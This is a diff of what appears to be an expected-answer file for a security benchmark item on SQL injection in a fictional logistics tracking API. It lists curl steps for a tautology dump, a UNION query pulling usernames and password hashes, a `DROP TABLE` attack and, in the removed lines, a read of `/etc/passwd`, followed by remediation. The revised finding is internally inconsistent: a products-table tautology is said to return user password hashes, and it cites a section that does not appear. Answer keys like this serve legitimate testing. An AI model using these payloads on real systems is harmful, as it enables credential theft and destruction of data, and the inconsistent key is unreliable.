@@ -1,63 +1,60 @@
 # Expected Response
 
 ## System
-- Domain: Logistics / Supply Chain
-- System: FreightLens Tracking API
+- System: FreightLens Tracking API v1.9.0
+- Domain: LOGISTICS / SUPPLY CHAIN
 - Example ID: INJ-0113
-- Vulnerability: SQL Injection
+- Risk ID: RISK-INJ-113
+- Vulnerability: SQL Injection (SQLi)
 
-## Priority Findings
+## Findings
 
-### Finding 1: SQL Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. SQL Injection on `/api/v1/products?tag=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables SQL Injection (SQLi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `tag` parameter is directly interpolated into a raw SQL query without parameterization: `SELECT * FROM products WHERE tag = '${req.query.tag}'`. The HAR capture shows `tag=' OR 1=1 --` tautology injection returning all records including admin credentials. The application connects as `db_owner`, enabling DDL attacks.
 
 **Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=' OR 1=1 --`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '' OR 1=1 --'`
-  evaluates to true for all rows when the payload is `' OR 1=1 --`
+- Endpoint: `GET /api/v1/products?tag=' OR 1=1 --`
+- Response: HTTP 200 with all user records including `password_hash` and `role: "ADMIN"`
+- Query constructed: `SELECT * FROM products WHERE tag = '' OR 1=1 --'` — evaluates true for all rows
+- `db_owner` account confirmed in Section 6.0
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.freightlens-tra.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag=normalvalue" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching product records only.
 
-### Step 2 — Inject SQLi payload
+**Step 2 — SQLi tautology injection: dump all records (primary HAR attack):**
 ```bash
-curl -s "https://api.freightlens-tra.example.com/api/v1/users?search='%20OR%201=1%20--" \
+curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag=%27%20OR%201%3D1%20--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** All rows returned including admin `password_hash` — as observed in HAR response.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — UNION data exfiltration: credential dump (db_owner):**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag=' UNION SELECT username,password_hash,role FROM users--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** All usernames, password hashes, and roles returned — full credential exfiltration.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — DDL attack: destroy supply chain tracking data (db_owner):**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag='; DROP TABLE products--" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** `products` table dropped — complete loss of logistics/supply chain tracking data (operational sabotage).
+
+**Step 5 — Verbose error confirmation:**
+```bash
+curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected verbose error:** SQL syntax error leaking table name `products`, column names, or DB version.
 
 ## Secure Outcome
 ```json
@@ -65,8 +62,8 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- **Parameterized queries (RISK-INJ-113):** Replace `SELECT * FROM products WHERE tag = '${req.query.tag}'` with prepared statement: `SELECT * FROM products WHERE tag = ?` with bound parameter.
+- **Restrict DB account:** Application account must not run as `db_owner`; grant only `SELECT`/`INSERT`/`UPDATE`/`DELETE` on required tables.
+- **Disable verbose error messages in production:** Return generic 400/500 without SQL details.
+- **Deploy WAF / input validation middleware** on legacy `/api/v1/products` endpoint; reject SQL metacharacters.
+- **ORM audit:** Review all `raw()` or native query calls; apply parameterization.
